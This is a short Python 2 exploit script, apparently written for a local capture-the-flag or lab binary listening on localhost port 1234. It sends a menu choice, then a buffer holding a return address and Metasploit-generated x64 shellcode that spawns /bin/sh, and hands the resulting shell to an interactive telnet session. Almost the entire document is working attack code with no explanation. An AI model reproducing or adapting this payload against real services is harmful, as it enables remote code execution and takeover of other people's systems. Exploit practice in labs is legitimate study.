#!/usr/bin/python

import struct, time, re, telnetlib, socket

# execute /bin/sh, generated with metasploit module payload/linux/x64/exec
# generate -o CMD="/bin/sh" -b '\x00\x0a\x0d\x20' -t py




#buf  = "1 2 0 0 "
buf  = "\xc8\x10\x60\x00\x00\x00\x00\x00" #address to where shellcode starts

buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x3b\xfb\xed\x40\xb4\xfb\x71"
buf += "\x01\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\x51\xc0\xb5\xd9\xfc\x40\x5e\x63\x52\x95\xc2\x33\xdc"
buf += "\xfb\x22\x49\xb2\x1c\x85\x6d\xd7\xfb\x71\x49\xb2\x1d"
buf += "\xbf\xa8\xbc\xfb\x71\x01\x14\x99\x84\x2e\x9b\x88\x19"
buf += "\x01\x6d\xac\xa5\xc9\x52\xf4\x74\x01"

buf += "\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 1234))

#print s.recv(1000)
s.send("9\n")
time.sleep(0.5)

print s.recv(1000)
s.send(buf)

t = telnetlib.Telnet()
t.sock = s
t.interact()


